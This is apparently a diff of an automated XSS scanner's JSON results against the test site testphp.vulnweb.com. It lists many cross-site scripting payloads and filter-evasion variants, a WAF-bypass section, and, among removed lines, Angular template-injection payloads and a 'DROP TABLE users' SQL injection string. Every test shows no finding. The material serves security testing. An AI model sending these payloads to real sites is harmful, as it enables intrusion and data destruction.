@@ -1,9 +1,37 @@
 {
   "url": "http://testphp.vulnweb.com",
-  "timestamp": "2025-04-16T19:57:36.195527",
-  "tests_run": 26,
+  "timestamp": "2025-04-17T11:48:46.275363",
+  "tests_run": 15,
   "vulnerabilities_found": 0,
   "analysis": [
+    {
+      "payload": "<iframe src='javascript:alert(1)'></iframe>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C/iframe%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<body onload=al\u200bert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cbody%20onload%3Dal%E2%80%8Bert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
     {
       "payload": "<script>alert('XSS')</script>",
       "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
@@ -19,8 +47,8 @@
       "risk_level": "low"
     },
     {
-      "payload": "<img src=x onerror=alert('XSS')>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+      "payload": "<scr\tipt>alert('XSS')</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscr%09ipt%3Ealert%28%27XSS%27%29%3C/script%3E",
       "status_code": 200,
       "vulnerabilities": [],
       "reflection_points": [
@@ -33,8 +61,8 @@
       "risk_level": "low"
     },
     {
-      "payload": "<svg onload=alert('XSS')>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E",
+      "payload": "<scr&#105;pt>alert('XSS')</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscr%26%23105%3Bpt%3Ealert%28%27XSS%27%29%3C/script%3E",
       "status_code": 200,
       "vulnerabilities": [],
       "reflection_points": [
@@ -61,8 +89,78 @@
       "risk_level": "low"
     },
     {
-      "payload": "1'; DROP TABLE users; <script>alert('XSS')</script>--",
-      "test_url": "http://testphp.vulnweb.com?searchFor=1%27%3B%20DROP%20TABLE%20users%3B%20%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E--",
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<body onload=al\\145rt('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cbody%20onload%3Dal%5C145rt%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<body onload=prompt('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cbody%20onload%3Dprompt%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<img src=x onerror=a\nl\ne\nr\nt('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cimg%20src%3Dx%20onerror%3Da%0Al%0Ae%0Ar%0At%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<img src=x onerror=al\u200bert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cimg%20src%3Dx%20onerror%3Dal%E2%80%8Bert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<img src=x onerror=prompt('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cimg%20src%3Dx%20onerror%3Dprompt%28%27XSS%27%29%3E",
       "status_code": 200,
       "vulnerabilities": [],
       "reflection_points": [
@@ -89,8 +187,8 @@
       "risk_level": "low"
     },
     {
-      "payload": "\";alert('XSS');//",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%22%3Balert%28%27XSS%27%29%3B//",
+      "payload": "<scr \n\nipt>alert('XSS')</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscr%20%0A%0Aipt%3Ealert%28%27XSS%27%29%3C/script%3E",
       "status_code": 200,
       "vulnerabilities": [],
       "reflection_points": [
@@ -103,260 +201,8 @@
       "risk_level": "low"
     },
     {
-      "payload": "<script>document.write('<img src=\"x\" onerror=\"alert('XSS')\">')</script>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28%27XSS%27%29%22%3E%27%29%3C/script%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<script>eval(location.hash.slice(1))</script>#alert('XSS')",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3Eeval%28location.hash.slice%281%29%29%3C/script%3E%23alert%28%27XSS%27%29",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<iframe src='javascript:alert(1)'></iframe>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C/iframe%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<video><source onerror=\"javascript:alert('XSS')\">",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<audio src=x onerror=alert('XSS')>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<body onload=alert('XSS')>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<input autofocus onfocus=alert('XSS')>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cinput%20autofocus%20onfocus%3Dalert%28%27XSS%27%29%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<details open ontoggle=alert('XSS')>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cdetails%20open%20ontoggle%3Dalert%28%27XSS%27%29%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS')>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C%21--%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cnoscript%3E%3Cp%20title%3D%22%3C/noscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%22%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<script>\\u0061lert('XSS')</script>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3E%5Cu0061lert%28%27XSS%27%29%3C/script%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3CScRiPt%3Ealert%28%27XSS%27%29%3C/ScRiPt%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<IMG SRC=JaVaScRiPt:alert('XSS')>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3CIMG%20SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<script>a=alert;a('XSS');</script>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3Ea%3Dalert%3Ba%28%27XSS%27%29%3B%3C/script%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<script nonce=abc>alert('XSS')</script>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%20nonce%3Dabc%3Ealert%28%27XSS%27%29%3C/script%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<script src=\"data:text/javascript,alert('XSS')\"></script>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%20src%3D%22data%3Atext/javascript%2Calert%28%27XSS%27%29%22%3E%3C/script%3E",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "{{constructor.constructor('alert(\"XSS\")')()}}",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%7B%7Bconstructor.constructor%28%27alert%28%22XSS%22%29%27%29%28%29%7D%7D",
-      "status_code": 200,
-      "vulnerabilities": [],
-      "reflection_points": [
-        {
-          "framework": "angular",
-          "context": "framework_detection",
-          "reflection_type": "framework"
-        }
-      ],
-      "risk_level": "low"
-    },
-    {
-      "payload": "<div ng-app ng-csp>{{$eval.constructor('alert(\"XSS\")')()}}</div>",
-      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cdiv%20ng-app%20ng-csp%3E%7B%7B%24eval.constructor%28%27alert%28%22XSS%22%29%27%29%28%29%7D%7D%3C/div%3E",
+      "payload": "<img src=x onerror=al\\145rt('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cimg%20src%3Dx%20onerror%3Dal%5C145rt%28%27XSS%27%29%3E",
       "status_code": 200,
       "vulnerabilities": [],
       "reflection_points": [
@@ -371,7 +217,7 @@
   ],
   "base_analysis": {
     "url": "http://testphp.vulnweb.com",
-    "timestamp": "2025-04-16T19:57:36.564684",
+    "timestamp": "2025-04-17T11:48:46.634265",
     "vulnerabilities": [],
     "reflection_points": [
       {
@@ -403,11 +249,88 @@
       "risk_level": "low"
     }
   },
+  "waf_bypass_results": [
+    {
+      "base_payload": "<script>alert('XSS')</script>",
+      "variations_tested": 3,
+      "successful_bypasses": 0,
+      "results": [
+        {
+          "technique": "script_tag",
+          "payload": "<script>alert('XSS')</script>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        },
+        {
+          "technique": "script_tag",
+          "payload": "<scr\tipt>alert('XSS')</script>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        },
+        {
+          "technique": "script_tag",
+          "payload": "<scr\nipt>alert('XSS')</script>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        }
+      ]
+    },
+    {
+      "base_payload": "<img src=x onerror=alert('XSS')>",
+      "variations_tested": 3,
+      "successful_bypasses": 0,
+      "results": [
+        {
+          "technique": "alert_function",
+          "payload": "<img src=x onerror=al\u200bert('XSS')>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        },
+        {
+          "technique": "alert_function",
+          "payload": "<img src=x onerror=al\\145rt('XSS')>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        },
+        {
+          "technique": "alert_function",
+          "payload": "<img src=x onerror=al/* */ert('XSS')>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        }
+      ]
+    },
+    {
+      "base_payload": "<body onload=alert('XSS')>",
+      "variations_tested": 3,
+      "successful_bypasses": 0,
+      "results": [
+        {
+          "technique": "alert_function",
+          "payload": "<body onload=al\u200bert('XSS')>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        },
+        {
+          "technique": "alert_function",
+          "payload": "<body onload=al\\145rt('XSS')>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        },
+        {
+          "technique": "alert_function",
+          "payload": "<body onload=al/* */ert('XSS')>",
+          "reflection_detected": false,
+          "risk_level": "low"
+        }
+      ]
+    }
+  ],
   "vulnerable_paths": {
     "/search.php?test=query": {
       "base_analysis": {
         "url": "http://testphp.vulnweb.com/search.php?test=query",
-        "timestamp": "2025-04-16T19:57:46.139873",
+        "timestamp": "2025-04-17T11:48:55.522809",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -462,7 +385,7 @@
       },
       "payload_analysis": {
         "url": "http://testphp.vulnweb.com/search.php?test=query&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
-        "timestamp": "2025-04-16T19:57:46.498705",
+        "timestamp": "2025-04-17T11:48:55.882180",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -519,7 +442,7 @@
     "/artists.php?artist=1": {
       "base_analysis": {
         "url": "http://testphp.vulnweb.com/artists.php?artist=1",
-        "timestamp": "2025-04-16T19:57:46.856173",
+        "timestamp": "2025-04-17T11:48:56.238711",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -644,7 +567,7 @@
       },
       "payload_analysis": {
         "url": "http://testphp.vulnweb.com/artists.php?artist=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
-        "timestamp": "2025-04-16T19:57:47.269257",
+        "timestamp": "2025-04-17T11:48:56.594939",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -771,7 +694,7 @@
     "/listproducts.php?cat=1": {
       "base_analysis": {
         "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
-        "timestamp": "2025-04-16T19:57:47.661833",
+        "timestamp": "2025-04-17T11:48:56.951725",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -1106,7 +1029,7 @@
       },
       "payload_analysis": {
         "url": "http://testphp.vulnweb.com/listproducts.php?cat=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
-        "timestamp": "2025-04-16T19:57:48.036633",
+        "timestamp": "2025-04-17T11:48:57.319424",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -1443,7 +1366,7 @@
     "/product.php?pic=1": {
       "base_analysis": {
         "url": "http://testphp.vulnweb.com/product.php?pic=1",
-        "timestamp": "2025-04-16T19:57:48.419147",
+        "timestamp": "2025-04-17T11:48:57.703263",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -1636,7 +1559,7 @@
       },
       "payload_analysis": {
         "url": "http://testphp.vulnweb.com/product.php?pic=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
-        "timestamp": "2025-04-16T19:57:48.788368",
+        "timestamp": "2025-04-17T11:48:58.076658",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -1831,7 +1754,7 @@
     "/comment.php?pid=1": {
       "base_analysis": {
         "url": "http://testphp.vulnweb.com/comment.php?pid=1",
-        "timestamp": "2025-04-16T19:57:49.184830",
+        "timestamp": "2025-04-17T11:48:58.442244",
         "vulnerabilities": [],
         "reflection_points": [],
         "sinks_identified": [],
@@ -1851,7 +1774,7 @@
       },
       "payload_analysis": {
         "url": "http://testphp.vulnweb.com/comment.php?pid=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
-        "timestamp": "2025-04-16T19:57:49.526050",
+        "timestamp": "2025-04-17T11:48:58.786704",
         "vulnerabilities": [],
         "reflection_points": [],
         "sinks_identified": [],
@@ -1873,7 +1796,7 @@
     "/guestbook.php": {
       "base_analysis": {
         "url": "http://testphp.vulnweb.com/guestbook.php",
-        "timestamp": "2025-04-16T19:57:49.877438",
+        "timestamp": "2025-04-17T11:48:59.132407",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -1907,7 +1830,7 @@
       },
       "payload_analysis": {
         "url": "http://testphp.vulnweb.com/guestbook.php?xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
-        "timestamp": "2025-04-16T19:57:50.223874",
+        "timestamp": "2025-04-17T11:48:59.483648",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -1943,7 +1866,7 @@
     "/userinfo.php?uid=1": {
       "base_analysis": {
         "url": "http://testphp.vulnweb.com/userinfo.php?uid=1",
-        "timestamp": "2025-04-16T19:57:50.749935",
+        "timestamp": "2025-04-17T11:48:59.999141",
         "vulnerabilities": [],
         "reflection_points": [
           {
@@ -2082,7 +2005,7 @@
       },
       "payload_analysis": {
         "url": "http://testphp.vulnweb.com/userinfo.php?uid=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
-        "timestamp": "2025-04-16T19:57:51.283299",
+        "timestamp": "2025-04-17T11:49:00.525857",
         "vulnerabilities": [],
         "reflection_points": [
           {
